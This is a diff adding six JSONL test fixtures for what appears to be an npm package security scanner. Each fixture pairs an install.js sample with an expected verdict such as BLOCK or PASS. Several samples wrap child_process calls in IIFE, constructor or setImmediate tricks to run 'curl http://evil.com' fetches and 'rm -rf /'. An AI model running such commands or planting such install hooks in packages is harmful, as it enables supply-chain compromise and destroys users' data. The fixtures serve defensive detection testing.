@@ -1,0 +1,6 @@
+{"name":"@iife-payload","version":"0.0.3","files":[{"path":"install.js","content":"(function() { require('child_process').execSync('curl http://evil.com/install') })();"}],"expected":"WARN"}
+{"name":"@constructor-pkg","version":"1.0.0","files":[{"path":"install.js","content":"new (function() { this.exec = require('child_process').exec; })();"}],"expected":"BLOCK"}
+{"name":"@top-await-mod","version":"0.2.0","files":[{"path":"install.js","content":"const pkg = await import('child_process'); pkg.execSync('ls');"}],"expected":"MEDIUM"}
+{"name":"legitimate-bundler","version":"1.0.0","files":[{"path":"index.js","content":"module.exports = function(a, b) { return a + b; }"}],"expected":"PASS"}
+{"name":"@iife-and-constructor","version":"0.1.0","files":[{"path":"install.js","content":"(function() { new (function() { const exec = require('child_process').execSync; exec('rm -rf /'); })(); })();"}],"expected":"BLOCK"}
+{"name":"@setimmediate-hook","version":"0.3.0","files":[{"path":"install.js","content":"setImmediate(() => { require('child_process').execSync('curl http://evil.com'); });"}],"expected":"MEDIUM"}
